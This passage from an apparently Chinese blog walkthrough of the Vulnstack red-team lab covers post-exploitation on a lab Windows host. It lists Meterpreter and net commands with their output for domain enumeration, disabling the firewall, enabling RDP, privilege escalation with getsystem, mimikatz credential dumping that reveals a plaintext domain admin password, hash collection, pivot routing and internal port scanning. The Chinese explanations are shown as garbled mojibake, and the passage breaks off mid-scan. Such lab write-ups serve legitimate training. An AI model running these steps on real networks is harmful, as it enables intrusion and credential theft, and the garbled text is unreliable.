MAC : <span class=\"hljs-number\">00</span>:0c:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">55</span>:cf:<span class=\"hljs-number\">64</span>\nMTU          : <span class=\"hljs-number\">1500</span>\nIPv4 Address : <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.186</span>\nIPv4 Netmask : <span class=\"hljs-number\">255.255</span><span class=\"hljs-number\">.255</span><span class=\"hljs-number\">.0</span>\nIPv6 Address : fe80::407d:48b5:70cc:cce6\nIPv6 Netmask : ffff:ffff:ffff:ffff::\n</code></pre>\n<p>å¯ä»¥æŸ¥çœ‹åˆ°å­˜åœ¨ä¸¤å¼ ç½‘å¡ï¼Œå†…ç½‘åœ°å€æ˜¯<code>192.168.52.143</code></p>\n</li>\n<li>\n<p>å½“å‰ä¸»æœºç³»ç»Ÿä¿¡æ¯ç­‰</p>\n<pre><code class=\"hljs language-python\">meterpreter > sysinfo\nComputer        : STU1\nOS              : Windows <span class=\"hljs-number\">7</span> (<span class=\"hljs-number\">6.1</span> Build <span class=\"hljs-number\">7601</span>, Service Pack <span class=\"hljs-number\">1</span>).\nArchitecture    : x64\nSystem Language : zh_CN\nDomain          : GOD\nLogged On Users : <span class=\"hljs-number\">2</span>\nMeterpreter     : x86/windows\n</code></pre>\n<p>å­˜åœ¨åŸŸ<code>GOD</code></p>\n</li>\n<li>\n<p>å‘ç°ä¸»DNSåç¼€ä¸ä¸ºç©ºï¼Œå­˜åœ¨åŸŸ<code>god.org</code></p>\n<pre><code class=\"hljs language-python\">C:\\phpStudy\\WWW>net config workstation\nnet config workstation\nComputer name                        \\\\STU1\nFull Computer name                   stu1.god.org\nUser name                            Administrator\n\nWorkstation active on                \n        NetBT_Tcpip_{4DAEBDFD-0177-<span class=\"hljs-number\">4691</span>-<span class=\"hljs-number\">8243</span>-B73297E2F0FF} (000C2955CF5A)\n        NetBT_Tcpip_{43B076D2-BB12-<span class=\"hljs-number\">42E8</span>-AF64-3CFB49A31501} (000C2955CF64)\n        NetBT_Tcpip_{EC57C4EB-<span class=\"hljs-number\">763E-4000</span>-9CDE-4D7FF15DF74C} (02004C4F4F50)\n\nSoftware version                     Windows <span class=\"hljs-number\">7</span> Professional\n\nWorkstation domain                   GOD\nWorkstation Domain DNS Name          god.org\nLogon domain                         GOD\n\nCOM Open Timeout (sec)               <span class=\"hljs-number\">0</span>\nCOM Send Count (byte)                <span class=\"hljs-number\">16</span>\nCOM Send Timeout (msec)              <span class=\"hljs-number\">250</span>\nThe command completed successfully.\n</code></pre>\n</li>\n<li>\n<p>å¯»æ‰¾æ˜¯å¦å­˜åœ¨åˆ«çš„åŸŸ</p>\n<pre><code class=\"hljs language-python\">C:\\phpStudy\\WWW>net view /domain\nnet view /domain\nDomain\n\n-------------------------------------------------------------------------------\nGOD                  \nThe command completed successfully.\n</code></pre>\n<p>ä»…å­˜åœ¨ä¸€ä¸ªåŸŸ</p>\n</li>\n<li>\n<p>åªæœ‰ä¸€ä¸ªåŸŸæˆ‘ä»¬å°±æŸ¥çœ‹åŸŸæ§åˆ¶å™¨çš„ä¸»æœºåï¼Œæ–¹ä¾¿æˆ‘ä»¬å»ç¡®å®šé‚£å°æ˜¯åŸŸæ§<code>DC</code></p>\n<pre><code class=\"hljs language-python\">C:\\phpStudy\\WWW>net group <span class=\"hljs-string\">\"domain controllers\"</span> /domain\nThe request will be processed at a domain controller <span class=\"hljs-keyword\">for</span> domain god.org.\n\nGroup name     Domain Controllers\nComment        \n\nMembers\n\n-------------------------------------------------------------------------------\nOWA$                     \nThe command completed successfully.\n</code></pre>\n<p>ç¡®å®šåŸŸæ§åˆ¶å™¨ä¸»æœºåä¸º<code>OWA</code></p>\n</li>\n<li>\n<p>æŸ¥çœ‹åŸŸå†…ä¸»æœºå…¶ä»–ä¸»æœºä¿¡æ¯</p>\n<pre><code class=\"hljs language-python\">C:\\phpStudy\\WWW>net view\nnet view\nServer Name            Remark\n\n-------------------------------------------------------------------------------\n\\\\OWA                                                                          \n\\\\ROOT-TVI862UBEH                                                              \nThe command completed successfully.\n</code></pre>\n<p>åŸŸæ§ <code>OWA</code>ï¼ŒåŸŸæˆå‘˜<code>ROOT-TVI862UBEH</code></p>\n<p>ç„¶åé€šè¿‡<code>ping</code>å‘½ä»¤è·å–<code>IP</code></p>\n<pre><code class=\"hljs language-python\">C:\\phpStudy\\WWW>ping owa\nPinging owa.god.org [<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.138</span>] <span class=\"hljs-keyword\">with</span> <span class=\"hljs-number\">32</span> <span class=\"hljs-built_in\">bytes</span> of data:\nC:\\phpStudy\\WWW>ping ROOT-TVI862UBEH\nPinging ROOT-TVI862UBEH.god.org [<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>] <span class=\"hljs-keyword\">with</span> <span class=\"hljs-number\">32</span> <span class=\"hljs-built_in\">bytes</span> of data:\n</code></pre>\n<p>åŸŸæ§<code>OWA 192.168.52.138</code>ï¼›åŸŸæˆå‘˜<code>ROOT-TVI862UBEH 192.168.52.141</code> æ¥ä¸‹æ¥çš„ç›®çš„å°±æ˜¯æ¨ªå‘æ‹¿ä¸‹åŸŸæ§</p>\n</li>\n<li>\n<p>æŸ¥çœ‹åŸŸå†…ç”¨æˆ·ï¼Œæœ‰äº”ä¸ªç”¨æˆ·</p>\n<pre><code class=\"hljs language-python\">C:\\phpStudy\\WWW>net user /domain\nnet user /domain\nThe request will be processed at a domain controller <span class=\"hljs-keyword\">for</span> domain god.org.\n\nUser accounts <span class=\"hljs-keyword\">for</span> \\\\owa.god.org\n\n-------------------------------------------------------------------------------\nAdministrator            Guest                    krbtgt                   \nligang                   liukaifeng01             \nThe command completed successfully.\n</code></pre>\n</li>\n<li>\n<p>æŸ¥çœ‹å“ªä¸ªæ˜¯ç®¡ç†å‘˜ç”¨æˆ·ï¼Œ<code>Administrator</code> å°±æ˜¯åŸŸç®¡ç†å‘˜</p>\n<pre><code class=\"hljs language-python\">C:\\phpStudy\\WWW>net group <span class=\"hljs-string\">\"domain admins\"</span> /domain\nnet group <span class=\"hljs-string\">\"domain admins\"</span> /domain\nThe request will be processed at a domain controller <span class=\"hljs-keyword\">for</span> domain god.org.\n\nGroup name     Domain Admins\nComment        \n\nMembers\n\n-------------------------------------------------------------------------------\nAdministrator            OWA$                     \nThe command completed successfully.\n\nC:\\phpStudy\\WWW>\n</code></pre>\n</li>\n</ol>\n<h2>è·å¾—é¶æœºè¿œç¨‹æ¡Œé¢</h2>\n<h3>å¼€å¯é¶æœºRPD</h3>\n<ol>\n<li>\n<p>é¶æœºé»˜è®¤æ²¡æœ‰å¼€å¯<code>3389</code>ç«¯å£ï¼ŒåŒæ—¶è¿˜æœ‰é˜²ç«å¢™</p>\n</li>\n<li>\n<p>é¦–å…ˆå…³é—­é˜²ç«å¢™</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\">#å…³é—­é˜²ç«å¢™</span>\nnetsh firewall <span class=\"hljs-built_in\">set</span> opmode disable <span class=\"hljs-comment\">#winsows server 2003 ä¹‹å‰</span>\nnetsh advfirewall <span class=\"hljs-built_in\">set</span> allprofiles state off <span class=\"hljs-comment\">#winsows server 2003 ä¹‹å</span>\n</code></pre>\n</li>\n<li>\n<p>é€šè¿‡MSFå¯åŠ¨RDPæœåŠ¡</p>\n<pre><code class=\"hljs language-python\">meterpreter > run post/windows/manage/enable_rdp\n\n[*] Enabling Remote Desktop\n[*]     RDP <span class=\"hljs-keyword\">is</span> disabled; enabling it ...\n[*] Setting Terminal Services service startup mode\n[*]     The Terminal Services service <span class=\"hljs-keyword\">is</span> <span class=\"hljs-keyword\">not</span> <span class=\"hljs-built_in\">set</span> to auto, changing it to auto ...\n[*]     Opening port <span class=\"hljs-keyword\">in</span> local firewall <span class=\"hljs-keyword\">if</span> necessary\n[*] For cleanup execute Meterpreter resource file: /root/.msf4/loot/20241113014044_default_192<span class=\"hljs-number\">.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.186</span>_host.windows.cle_649955.txt\n</code></pre>\n</li>\n</ol>\n<h3>ç ´è§£å¯†ç </h3>\n<ol>\n<li>\n<p>å¼€å¯RDPæœåŠ¡åæˆ‘ä»¬è¿˜éœ€è¦å¯†ç æ‰èƒ½ç™»é™†</p>\n</li>\n<li>\n<p>æŸ¥çœ‹å½“å‰ç”¨æˆ·</p>\n<pre><code class=\"hljs language-python\">meterpreter > getuid\nServer username: GOD\\Administrator\n</code></pre>\n<p>åŸŸç®¡ç†å‘˜ç”¨æˆ·</p>\n</li>\n<li>\n<p>åœ¨MSFä½¿ç”¨<code>getsystem</code> è·å¾—æƒé™</p>\n<pre><code class=\"hljs language-python\">meterpreter > getsystem\n...got system via technique <span class=\"hljs-number\">1</span> (Named Pipe Impersonation (In Memory/Admin)).\nmeterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM\n</code></pre>\n<p>å˜æˆ<code>NT AUTHORITY\\SYSTEM</code> è¿™æ˜¯æœ¬åœ°ç”¨æˆ·ï¼Œæ˜¯ç³»ç»Ÿæœ€é«˜æƒé™ï¼Œå› ä¸ºæˆ‘ä»¬éœ€è¦ç ´è§£å¯†ç </p>\n</li>\n<li>\n<p>ä½¿ç”¨MSFé‡Œçš„<code>mimikatz</code>æ¨¡å—</p>\n<p><code>mimikatz</code>æ¨¡å—çš„ä½¿ç”¨éœ€è¦<code>Administrator</code>æƒé™æˆ–è€…<code>System</code>æƒé™ï¼Œè¿™å°±æˆ‘ä»¬ä¸ºä»€ä¹ˆéœ€è¦<code>getsystem</code></p>\n<ul>\n<li>\n<p>åŠ è½½<code>mimikatz</code> æ¨¡å—</p>\n<pre><code class=\"hljs language-python\">meterpreter > load mimikatz\n[!] The <span class=\"hljs-string\">\"mimikatz\"</span> extension has been replaced by <span class=\"hljs-string\">\"kiwi\"</span>. Please use this <span class=\"hljs-keyword\">in</span> future.\nLoading extension kiwi...\n  .<span class=\"hljs-comment\">#####.   mimikatz 2.2.0 20191125 (x86/windows)</span>\n .<span class=\"hljs-comment\">## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)</span>\n <span class=\"hljs-comment\">## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span>\n <span class=\"hljs-comment\">## \\ / ##       > http://blog.gentilkiwi.com/mimikatz</span>\n <span class=\"hljs-string\">'## v ##'</span>        Vincent LE TOUX            ( vincent.letoux@gmail.com )\n  <span class=\"hljs-string\">'#####'</span>         > http://pingcastle.com / http://mysmartlogon.com  ***/\n\n[!] Loaded x86 Kiwi on an x64 architecture.\n\nSuccess.\n</code></pre>\n</li>\n<li>\n<p>è¿è¡Œ<code>creds_all</code> å‘½ä»¤</p>\n<pre><code class=\"hljs language-python\">meterpreter > creds_all                                                                                                                                                                                           \n[+] Running <span class=\"hljs-keyword\">as</span> SYSTEM                                                                                                                                                                                             \n[*] Retrieving <span class=\"hljs-built_in\">all</span> credentials                                                                                                                                                                                    \n..... çœç•¥\nAdministrator  GOD.ORG      hongrisec@<span class=\"hljs-number\">2019</span>\nignoredjunk    ignoredjunk  ignoredjunk\nstu1$          GOD.ORG      d2 <span class=\"hljs-number\">64</span> a0 <span class=\"hljs-number\">33</span> a9 09 <span class=\"hljs-number\">93</span> <span class=\"hljs-number\">25</span> <span class=\"hljs-number\">30</span> cb 06 <span class=\"hljs-number\">36</span> c9 <span class=\"hljs-number\">74</span> fc <span class=\"hljs-number\">59</span> 3e 4f <span class=\"hljs-number\">49</span> 9a fc <span class=\"hljs-number\">20</span> 0a c3 f1 01 af <span class=\"hljs-number\">69</span> df <span class=\"hljs-number\">54</span> f4 <span class=\"hljs-number\">70</span> c0 fa 3e <span class=\"hljs-number\">13</span> <span class=\"hljs-number\">95</span> <span class=\"hljs-number\">11</span> <span class=\"hljs-number\">93</span> 9c <span class=\"hljs-number\">76</span> <span class=\"hljs-number\">39</span> 3c c1 ad f0 a3 4e <span class=\"hljs-number\">78</span> <span class=\"hljs-number\">61</span> b8 08 01 2d <span class=\"hljs-number\">42</span> c0 <span class=\"hljs-number\">82</span> <span class=\"hljs-number\">56</span> <span class=\"hljs-number\">66</span> <span class=\"hljs-number\">23</span>\n                            2e d1 07 da fd <span class=\"hljs-number\">12</span> b7 f6 <span class=\"hljs-number\">67</span> 8d <span class=\"hljs-number\">40</span> 4a d2 7f <span class=\"hljs-number\">47</span> 7c a5 b3 e5 7c 5d a0 0b <span class=\"hljs-number\">77</span> <span class=\"hljs-number\">45</span> c1 <span class=\"hljs-number\">92</span> <span class=\"hljs-number\">88</span> <span class=\"hljs-number\">38</span> de 6f <span class=\"hljs-number\">93</span> da b4 d1 c1 ec <span class=\"hljs-number\">20</span> da f7 <span class=\"hljs-number\">98</span> ac a8 05 <span class=\"hljs-number\">30</span> <span class=\"hljs-number\">71</span> <span class=\"hljs-number\">85</span> <span class=\"hljs-number\">68</span> 0b <span class=\"hljs-number\">39</span> de c4 <span class=\"hljs-number\">42</span> db <span class=\"hljs-number\">21</span> 4a <span class=\"hljs-number\">83</span> ee ed ea\n                            9f <span class=\"hljs-number\">48</span> e0 <span class=\"hljs-number\">59</span> 1a <span class=\"hljs-number\">95</span> f2 e7 c2 d7 <span class=\"hljs-number\">89</span> 9e 06 ca 05 a0 4e <span class=\"hljs-number\">25</span> a4 06 07 d4 cd <span class=\"hljs-number\">27</span> db 8d b1 bd c0 <span class=\"hljs-number\">78</span> <span class=\"hljs-number\">39</span> <span class=\"hljs-number\">72</span> <span class=\"hljs-number\">79</span> <span class=\"hljs-number\">37</span> a0 <span class=\"hljs-number\">75</span> <span class=\"hljs-number\">98</span> ab 8f 1a <span class=\"hljs-number\">11</span> ce <span class=\"hljs-number\">56</span> dd <span class=\"hljs-number\">90</span> 06 <span class=\"hljs-number\">97</span> 8e 01 df <span class=\"hljs-number\">52</span> f4 bc 8c b3 ae c9 c2 <span class=\"hljs-number\">15</span> bb\n                            <span class=\"hljs-number\">96</span> fb <span class=\"hljs-number\">62</span> df 7a <span class=\"hljs-number\">48</span> <span class=\"hljs-number\">63</span> <span class=\"hljs-number\">24</span> dc fb 4c 3c 6d fd <span class=\"hljs-number\">35</span> <span class=\"hljs-number\">18</span> b0 <span class=\"hljs-number\">82</span> 4a ec a5 ee d1 de <span class=\"hljs-number\">46</span> <span class=\"hljs-number\">77</span> 2d 07 <span class=\"hljs-number\">20</span> <span class=\"hljs-number\">31</span> <span class=\"hljs-number\">79</span> <span class=\"hljs-number\">69</span> d3 5c fa <span class=\"hljs-number\">62</span> <span class=\"hljs-number\">46</span> <span class=\"hljs-number\">62</span> <span class=\"hljs-number\">50</span> 3b 09 d0 d6 <span class=\"hljs-number\">94</span> b9 d2 <span class=\"hljs-number\">99</span> <span class=\"hljs-number\">58</span> 4b a5 <span class=\"hljs-number\">21</span> 5c 03 5b 01 fa <span class=\"hljs-number\">95</span> ca <span class=\"hljs-number\">90</span> 8d\n</code></pre>\n<p>å¾—åˆ°å¯†ç <code>hongrisec@2019</code> ï¼Œä¹Ÿå°±æ˜¯åŸŸç®¡ç†å‘˜çš„å¯†ç </p>\n</li>\n</ul>\n</li>\n</ol>\n<h3>è¿æ¥é¶æœºRDP</h3>\n<ol>\n<li>\n<p>è´¦æˆ·<code>god\\administrator</code> ,å¯†ç ä½¿ç”¨<code>hongrisec@2019</code></p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%80)/image8.png\" alt=\"image.png\"></p>\n<p>è¿æ¥æˆåŠŸï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±æ‹¿ä¸‹äº†è¾¹ç¼˜ä¸»æœº<code>win7</code>çš„è¿œç¨‹æ¡Œé¢äº†</p>\n</li>\n<li>\n<p>æˆ‘ä»¬å°è¯•ä¸‹é€šè¿‡ç½‘ç»œè®¿é—®åŸŸæ§ä¸»æœºï¼Œå‡å¦‚<code>administrator</code>æ˜¯ç®¡ç†å‘˜è´¦æˆ·å°±å¯ä»¥æ­£å¸¸è®¿é—®</p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%80)/image9.png\" alt=\"image.png\"></p>\n<p>æœç„¶é¹¤çŒœæƒ³çš„ä¸€æ ·ï¼Œå¯ä»¥æ­£å¸¸è®¿é—®</p>\n</li>\n</ol>\n<h2>å†…ç½‘æ¸—é€</h2>\n<h3>ç»§ç»­å†…ç½‘ä¿¡æ¯æ”¶é›†ï¼Œä½¿ç”¨MSFçš„è„šæœ¬</h3>\n<ul>\n<li>\n<p>æŸ¥çœ‹é¶æœºæ˜¯å¦æ˜¯è™šæ‹Ÿæœºï¼Œæ˜¯å¦å¤„äºèœœç½ä¸­</p>\n<pre><code class=\"hljs language-python\">meterpreter > run post/windows/gather/checkvm \n\n[*] Checking <span class=\"hljs-keyword\">if</span> the target <span class=\"hljs-keyword\">is</span> a Virtual Machine ...\n[+] This <span class=\"hljs-keyword\">is</span> a VMware Virtual Machine\n</code></pre>\n<p>å› ä¸ºæˆ‘ä»¬ç°åœ¨æ˜¯é¶åœºç¯å¢ƒï¼Œæ‰€ä»¥æˆ‘ä»¬æ˜¯å‡ºäºè™šæ‹ŸæœºçŠ¶æ€çš„</p>\n</li>\n<li>\n<p>æŸ¥ç”¨ç”¨æˆ·ä¿¡æ¯ï¼Œå°†å¯†ç ç¦»æ•£å€¼ä¹Ÿå¼„å‡ºæ¥äº†ã€‚å¯†ç ç¦»æ•£å€¼é€šè¿‡<code>hashdump</code>ä¹Ÿå¯ä»¥è·å–</p>\n<pre><code class=\"hljs language-python\">meterpreter > run post/windows/gather/credentials/credential_collector \n\n[*] Running module against STU1\n[+] Collecting hashes...\n    Extracted: Administrator:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0\n    Extracted: Guest:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0\n    Extracted: liukaifeng01:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0\n[+] Collecting tokens...\n    GOD\\Administrator\n    NT AUTHORITY\\SYSTEM\n    No tokens available\n</code></pre>\n</li>\n<li>\n<p>æŸ¥çœ‹è¡¥ä¸ä¿¡æ¯</p>\n<pre><code class=\"hljs language-python\">meterpreter > run post/windows/gather/enum_patches \n[*] Running module against STU1 (<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.186</span>)\nInstalled Patches\n=================\n  HotFix ID  Install Date\n  ---------  ------------\n  KB2534111  <span class=\"hljs-number\">8</span>/<span class=\"hljs-number\">25</span>/<span class=\"hljs-number\">2019</span>\n  KB2999226  <span class=\"hljs-number\">9</span>/<span class=\"hljs-number\">15</span>/<span class=\"hljs-number\">2019</span>\n  KB958488   <span class=\"hljs-number\">8</span>/<span class=\"hljs-number\">29</span>/<span class=\"hljs-number\">2019</span>\n  KB976902   <span class=\"hljs-number\">11</span>/<span class=\"hljs-number\">21</span>/<span class=\"hljs-number\">2010</span>\n</code></pre>\n</li>\n<li>\n<p>æšä¸¾é¶æœºä¸Šå®‰è£…çš„åº”ç”¨ç¨‹åº</p>\n<pre><code class=\"hljs language-python\">meterpreter > run post/windows/gather/enum_applications \n[*] Enumerating applications installed on STU1\nInstalled Applications\n======================\n Name                                                            Version\n ----                                                            -------\n Microsoft Visual C++ <span class=\"hljs-number\">2008</span> Redistributable - x86 <span class=\"hljs-number\">9.0</span><span class=\"hljs-number\">.30729</span><span class=\"hljs-number\">.4148</span>  <span class=\"hljs-number\">9.0</span><span class=\"hljs-number\">.30729</span><span class=\"hljs-number\">.4148</span>\n Microsoft Visual C++ <span class=\"hljs-number\">2008</span> Redistributable - x86 <span class=\"hljs-number\">9.0</span><span class=\"hljs-number\">.30729</span><span class=\"hljs-number\">.4148</span>  <span class=\"hljs-number\">9.0</span><span class=\"hljs-number\">.30729</span><span class=\"hljs-number\">.4148</span>\n Microsoft Visual C++ <span class=\"hljs-number\">2008</span> Redistributable - x86 <span class=\"hljs-number\">9.0</span><span class=\"hljs-number\">.30729</span><span class=\"hljs-number\">.6161</span>  <span class=\"hljs-number\">9.0</span><span class=\"hljs-number\">.30729</span><span class=\"hljs-number\">.6161</span>\n Microsoft Visual C++ <span class=\"hljs-number\">2008</span> Redistributable - x86 <span class=\"hljs-number\">9.0</span><span class=\"hljs-number\">.30729</span><span class=\"hljs-number\">.6161</span>  <span class=\"hljs-number\">9.0</span><span class=\"hljs-number\">.30729</span><span class=\"hljs-number\">.6161</span>\n Microsoft Visual C++ <span class=\"hljs-number\">2013</span> Redistributable (x86) - <span class=\"hljs-number\">12.0</span><span class=\"hljs-number\">.21005</span>    <span class=\"hljs-number\">12.0</span><span class=\"hljs-number\">.21005</span><span class=\"hljs-number\">.1</span>\n Microsoft Visual C++ <span class=\"hljs-number\">2013</span> Redistributable (x86) - <span class=\"hljs-number\">12.0</span><span class=\"hljs-number\">.21005</span>    <span class=\"hljs-number\">12.0</span><span class=\"hljs-number\">.21005</span><span class=\"hljs-number\">.1</span>\n Microsoft Visual C++ <span class=\"hljs-number\">2013</span> x86 Additional Runtime - <span class=\"hljs-number\">12.0</span><span class=\"hljs-number\">.21005</span>   <span class=\"hljs-number\">12.0</span><span class=\"hljs-number\">.21005</span>\n Microsoft Visual C++ <span class=\"hljs-number\">2013</span> x86 Additional Runtime - <span class=\"hljs-number\">12.0</span><span class=\"hljs-number\">.21005</span>   <span class=\"hljs-number\">12.0</span><span class=\"hljs-number\">.21005</span>\n Microsoft Visual C++ <span class=\"hljs-number\">2013</span> x86 Minimum Runtime - <span class=\"hljs-number\">12.0</span><span class=\"hljs-number\">.21005</span>      <span class=\"hljs-number\">12.0</span><span class=\"hljs-number\">.21005</span>\n Microsoft Visual C++ <span class=\"hljs-number\">2013</span> x86 Minimum Runtime - <span class=\"hljs-number\">12.0</span><span class=\"hljs-number\">.21005</span>      <span class=\"hljs-number\">12.0</span><span class=\"hljs-number\">.21005</span>\n Microsoft Visual C++ <span class=\"hljs-number\">2017</span> Redistributable (x86) - <span class=\"hljs-number\">14.16</span><span class=\"hljs-number\">.27033</span>   <span class=\"hljs-number\">14.16</span><span class=\"hljs-number\">.27033</span><span class=\"hljs-number\">.0</span>\n Microsoft Visual C++ <span class=\"hljs-number\">2017</span> Redistributable (x86) - <span class=\"hljs-number\">14.16</span><span class=\"hljs-number\">.27033</span>   <span class=\"hljs-number\">14.16</span><span class=\"hljs-number\">.27033</span><span class=\"hljs-number\">.0</span>\n Microsoft Visual C++ <span class=\"hljs-number\">2017</span> X86 Additional Runtime - <span class=\"hljs-number\">14.16</span><span class=\"hljs-number\">.27033</span>  <span class=\"hljs-number\">14.16</span><span class=\"hljs-number\">.27033</span>\n Microsoft Visual C++ <span class=\"hljs-number\">2017</span> X86 Additional Runtime - <span class=\"hljs-number\">14.16</span><span class=\"hljs-number\">.27033</span>  <span class=\"hljs-number\">14.16</span><span class=\"hljs-number\">.27033</span>\n Microsoft Visual C++ <span class=\"hljs-number\">2017</span> X86 Minimum Runtime - <span class=\"hljs-number\">14.16</span><span class=\"hljs-number\">.27033</span>     <span class=\"hljs-number\">14.16</span><span class=\"hljs-number\">.27033</span>\n Microsoft Visual C++ <span class=\"hljs-number\">2017</span> X86 Minimum Runtime - <span class=\"hljs-number\">14.16</span><span class=\"hljs-number\">.27033</span>     <span class=\"hljs-number\">14.16</span><span class=\"hljs-number\">.27033</span>\n Mozilla Firefox <span class=\"hljs-number\">69.0</span><span class=\"hljs-number\">.1</span> (x86 zh-CN)                              <span class=\"hljs-number\">69.0</span><span class=\"hljs-number\">.1</span>\n Mozilla Firefox <span class=\"hljs-number\">69.0</span><span class=\"hljs-number\">.1</span> (x86 zh-CN)                              <span class=\"hljs-number\">69.0</span><span class=\"hljs-number\">.1</span>\n Nmap <span class=\"hljs-number\">7.80</span>                                                       <span class=\"hljs-number\">7.80</span>\n Nmap <span class=\"hljs-number\">7.80</span>                                                       <span class=\"hljs-number\">7.80</span>\n Notepad++ (<span class=\"hljs-number\">32</span>-bit x86)                                          <span class=\"hljs-number\">7.7</span><span class=\"hljs-number\">.1</span>\n Notepad++ (<span class=\"hljs-number\">32</span>-bit x86)                                          <span class=\"hljs-number\">7.7</span><span class=\"hljs-number\">.1</span>\n Npcap <span class=\"hljs-number\">0.9983</span>                                                    <span class=\"hljs-number\">0.9983</span>\n Npcap <span class=\"hljs-number\">0.9983</span>                                                    <span class=\"hljs-number\">0.9983</span>\n WinPcap <span class=\"hljs-number\">4.1</span><span class=\"hljs-number\">.3</span>                                                   <span class=\"hljs-number\">4.1</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.2980</span>\n WinPcap <span class=\"hljs-number\">4.1</span><span class=\"hljs-number\">.3</span>                                                   <span class=\"hljs-number\">4.1</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.2980</span>\n Wireshark <span class=\"hljs-number\">3.0</span><span class=\"hljs-number\">.4</span> <span class=\"hljs-number\">32</span>-bit                                          <span class=\"hljs-number\">3.0</span><span class=\"hljs-number\">.4</span>\n Wireshark <span class=\"hljs-number\">3.0</span><span class=\"hljs-number\">.4</span> <span class=\"hljs-number\">32</span>-bit                                          <span class=\"hljs-number\">3.0</span><span class=\"hljs-number\">.4</span>\n</code></pre>\n</li>\n</ul>\n<h3>å†…ç½‘ç«¯å£æ‰«æ</h3>\n<ol>\n<li>\n<p>æŠŠ<code>win7</code>å½“è·³æ¿ï¼Œåˆ™éœ€è¦æ·»åŠ è·¯ç”±</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\">#æ·»åŠ ä¸€æ¡è·¯ç”±</span>\nrun autoroute -s <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.0</span>/<span class=\"hljs-number\">24</span>  <span class=\"hljs-comment\"># åœ¨kaliä¸Šæ·»åŠ ä¸€æ¡é€šå‘å†…ç½‘çš„è·¯ç”±</span>\n<span class=\"hljs-comment\">#æŸ¥çœ‹è·¯ç”±æ·»åŠ æƒ…å†µ</span>\nrun autoroute -p\n</code></pre>\n</li>\n<li>\n<p>ç„¶åå°†å½“å‰ä¼šè¯æ”¾å…¥åå°ï¼Œå­˜ä¸º<code>session 1</code> ï¼Œåé¢å¯ä»¥é€šè¿‡<code>sessions</code>å‘½ä»¤æŒ‡å®š<code>1</code>å›åˆ°å½“å‰ä¼šè¯</p>\n<pre><code class=\"hljs language-python\">meterpreter > background\n[*] Backgrounding session <span class=\"hljs-number\">1.</span>.. \n</code></pre>\n</li>\n<li>\n<p>ä½¿ç”¨è¾…åŠ©æ¨¡å—é‡Œè¾¹çš„ç«¯å£æ‰«æï¼Œæ¥æ‰«æåŸŸé‡Œè¾¹çš„ä¸¤å°ä¸»æœº</p>\n<ul>\n<li>\n<p>é¦–å…ˆæ‰«æåŸŸæˆå‘˜çš„ç«¯å£</p>\n<pre><code class=\"hljs language-python\">msf6 exploit(multi/handler) > use auxiliary/scanner/portscan/tcp \nmsf6 auxiliary(scanner/portscan/tcp) > <span class=\"hljs-built_in\">set</span> rhosts <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>\nmsf6 auxiliary(scanner/portscan/tcp) > <span class=\"hljs-built_in\">set</span> ports <span class=\"hljs-number\">1</span>-<span class=\"hljs-number\">500</span>,<span class=\"hljs-number\">3389</span>,<span class=\"hljs-number\">3306</span>\nmsf6 auxiliary(scanner/portscan/tcp) > run\n[+] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:       - <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">21</span> - TCP OPEN\n[+] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:       - <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">135</span> - TCP OPEN\n[+] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:       - <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">139</span> - TCP OPEN\n[+] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:       - <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:<span class=\"hljs-number\">445</span> - TCP OPEN\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>:       - Scanned <span class=\"hljs-number\">1</span> of <span class=\"hljs-number\">1</span> hosts (<span class=\"hljs-number\">100</span>% complete)\n[*] Auxiliary module execution completed\n</code></pre>\n<p>å¼€å¯äº†<code>21</code>ï¼Œ<code>135</code>ï¼Œ<code>139</code>ï¼Œ<code>445</code></p>\n</li>\n<li>\n<p>æ‰«æåŸŸæ§</p>\n<pre><code class=\"hljs language-python\">msf6 auxiliary(scanner/portscan/tcp) > <span class=\"hljs-built_in\">set</span> rhosts <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.138</span>\n[+] 